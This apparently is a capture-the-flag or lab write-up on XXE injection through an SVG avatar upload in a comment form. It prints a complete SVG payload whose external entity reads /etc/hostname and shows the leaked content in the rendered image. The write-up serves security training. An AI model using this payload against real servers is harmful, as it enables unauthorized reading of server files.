## Overview  
This lab has comment form. This form has upload function and this accepts svg file. SVG is short for “Scalable Vector Graphics”.
It's a XML based two-dimensional graphic file format.When i upload the SVG file, the server doesn't verify the content of file So, I can embedd malicious command
into the svg file  
***a.svg***  
```<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY abc SYSTEM "file:///etc/hostname">]>
<svg width="300px" height="300px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="23" x="8" y="28">&abc;</text>
</svg>
```  
***Upload function***
![image](https://user-images.githubusercontent.com/22276823/127726182-f18fd945-0f03-4b2b-9ee5-9884792fdb42.png)  

After upload, we can see the image is used to avatar  
![image](https://user-images.githubusercontent.com/22276823/127726202-61c001d6-e3e7-442b-9e76-d11209e1323a.png)  

Open image, we can see the content of file that we embbed into svg  
![image](https://user-images.githubusercontent.com/22276823/127726228-be0cd6af-152e-499e-bd21-a33e82032d66.png)


